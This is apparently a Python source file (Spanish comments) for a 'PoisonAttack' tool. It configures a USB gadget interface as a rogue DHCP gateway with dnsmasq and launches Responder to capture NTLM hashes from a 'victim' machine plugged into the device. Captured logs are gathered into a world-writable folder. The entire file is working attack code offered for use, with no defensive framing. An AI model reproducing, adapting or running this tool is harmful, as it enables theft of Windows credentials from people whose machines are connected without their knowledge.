# poison_logic.py (versión corregida)
import os
import subprocess
import time
import re
import threading
import glob

class PoisonAttack:
    def __init__(self, interface=None, callback_consola=None, session_dir=None):
        self.interface = interface or self._detectar_interfaz_gadget()
        self.callback = callback_consola
        self.session_dir = session_dir
        self.stop_event = threading.Event()
        self.dns_proc = None
        self.proc_responder = None

    def log(self, texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        for simbolo in ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']:
            texto_limpio = texto_limpio.replace(simbolo, '')
        if self.callback:
            self.callback(f"{texto_limpio}")
        else:
            print(texto_limpio)

    def _detectar_interfaz_gadget(self):
        """
        Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM).
        Verifica que sea de tipo 1 (Ethernet) y que el dispositivo pertenezca al subsistema 'gadget'.
        """
        for iface in os.listdir('/sys/class/net/'):
            if iface == 'lo':
                continue
            type_path = f'/sys/class/net/{iface}/type'
            if not os.path.exists(type_path):
                continue
            with open(type_path) as f:
                iface_type = f.read().strip()
            # Las interfaces gadget son Ethernet (tipo 1)
            if iface_type != '1':
                continue
            # Verificar que es un dispositivo USB gadget (enlace simbólico contiene 'gadget')
            device_path = f'/sys/class/net/{iface}/device'
            if os.path.exists(device_path):
                try:
                    link = os.readlink(device_path)
                    if 'gadget' in link:
                        return iface
                except OSError:
                    pass
            # Fallback adicional: nombres comunes
            if iface.startswith('usb') or iface.startswith('enx'):
                return iface
        # Si no se encontró, intentar con nombres conocidos
        for candidate in ['usb0', 'enx']:
            if os.path.exists(f'/sys/class/net/{candidate}'):
                return candidate
        return 'usb0'  # último recurso

    def _limpiar_procesos_previos(self):
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
        os.system(f"sudo fuser -k 67/udp > /dev/null 2>&1")
        # Detener servicios que pueden interferir
        os.system("sudo systemctl stop systemd-resolved 2>/dev/null")
        os.system("sudo systemctl stop systemd-networkd 2>/dev/null")
        time.sleep(1)

    def start(self):
        self._limpiar_procesos_previos()
        iface = self.interface
    
        self.log("\n[!] DRAGON FLY SYSTEM")
        self.log(f"[*] Configurando interfaz: {iface}")
    
        try:
            self.log("[*] Desvinculando interfaz de gestores de red...")
            os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
            os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
            os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
            time.sleep(1)
    
            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
            os.system(f"sudo ip link set {iface} down 2>/dev/null")
            time.sleep(1)
            os.system(f"sudo ip link set {iface} up")
            time.sleep(2)
    
            # Desactivar IPv6 completamente para forzar DHCPv4
            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
    
            ip = "192.168.10.1"
            subnet_mask = "24"
            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
    
            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
            os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
    
            # Esperar a que la interfaz esté operativa y con IP
            self.log("[*] Aguardando enlace...")
            for _ in range(10):
                if os.system(f"ip addr show dev {iface} | grep -q '{ip}'") == 0:
                    break
                time.sleep(1)
    
            # Reglas de firewall para DHCP
            self.log("[*] Configurando firewall para DHCP...")
            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
    
            # Configuración dnsmasq mejorada
            config_dhcp = (
                f"interface={iface}\n"
                f"bind-interfaces\n"                     # Solo esta interfaz
                f"listen-address={ip}\n"
                f"dhcp-range={ip_range}\n"
                f"dhcp-option=3,{ip}\n"                  # Puerta de enlace
                f"dhcp-option=6,{ip}\n"                  # DNS
                f"dhcp-option=121,192.168.10.0/24,{ip}\n"  # Ruta estática sin clase
                f"dhcp-option=15,\n"                     # Dominio vacío
                f"dhcp-option=252,\n"                    # WPAD vacío
                f"no-resolv\n"
                f"no-hosts\n"
                f"port=0\n"                              # DNS desactivado
                f"log-dhcp\n"
                f"dhcp-authoritative\n"                  # Forzar oferta inmediata
            )
            with open("dnsmasq_temp.conf", "w") as f:
                f.write(config_dhcp)
    
            self.log("[*] Iniciando dnsmasq...")
            self.dns_proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            time.sleep(3)   # Dar tiempo para que dnsmasq abra los sockets
    
            if self.dns_proc.poll() is not None:
                err = self.dns_proc.stderr.read()
                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
                self.log("[*] Reintentando en modo foreground...")
                self.dns_proc = subprocess.Popen(
                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            else:
                self.log("[+] dnsmasq escuchando (DHCP listo).")
    
            # Detección de Responder (igual que antes)
            responder_paths = [
                "/usr/share/responder/Responder.py",
                "/opt/Responder/Responder.py"
            ]
            responder_cmd = None
            for path in responder_paths:
                if os.path.exists(path):
                    responder_cmd = ["sudo", "python3", path, "-I", iface, "-wvF"]
                    break
            if responder_cmd is None:
                responder_cmd = ["sudo", "responder", "-I", iface, "-wvF"]
    
            self.log(f"[+] INTERFAZ LISTA: {iface}")
            self.log(f"[+] IP: {ip}/{subnet_mask}")
            self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
            self.log(f"[+] Conecta ahora la víctima al puerto USB")
    
            self.proc_responder = subprocess.Popen(
                responder_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
    
            while not self.stop_event.is_set():
                linea = self.proc_responder.stdout.readline()
                if not linea and self.proc_responder.poll() is not None:
                    break
                if linea:
                    self.log(linea.strip())
    
        except Exception as e:
            self.log(f"\n[!] Error crítico: {e}")
        finally:
            self._cleanup()
    
    
    def _cleanup(self):
        self.log("\n[*] Deteniendo procesos y restaurando red...")
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
                self.dns_proc.wait(timeout=3)
            except:
                self.dns_proc.kill()
            self.dns_proc = None

        if self.proc_responder:
            try:
                self.proc_responder.terminate()
                self.proc_responder.wait(timeout=3)
            except:
                self.proc_responder.kill()
            self.proc_responder = None

        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        # Limpiar reglas de firewall
        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 67 -j ACCEPT 2>/dev/null")
        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
        # Restaurar servicios detenidos
        os.system("sudo systemctl start systemd-resolved 2>/dev/null")
        os.system("sudo systemctl start systemd-networkd 2>/dev/null")
        if os.path.exists("dnsmasq_temp.conf"):
            os.remove("dnsmasq_temp.conf")

        if self.session_dir:
            self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
            os.makedirs(self.session_dir, exist_ok=True)
            for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                if os.path.isdir(log_dir):
                    for f in glob.glob(os.path.join(log_dir, "*")):
                        try:
                            os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                        except:
                            subprocess.run(["sudo", "mv", f, self.session_dir], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)

        self.log("[+] Sistema restaurado. ¡Cacería finalizada!")

    def stop(self):
        self.stop_event.set()
        if self.proc_responder:
            try:
                self.proc_responder.terminate()
            except:
                pass
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
            except:
                pass
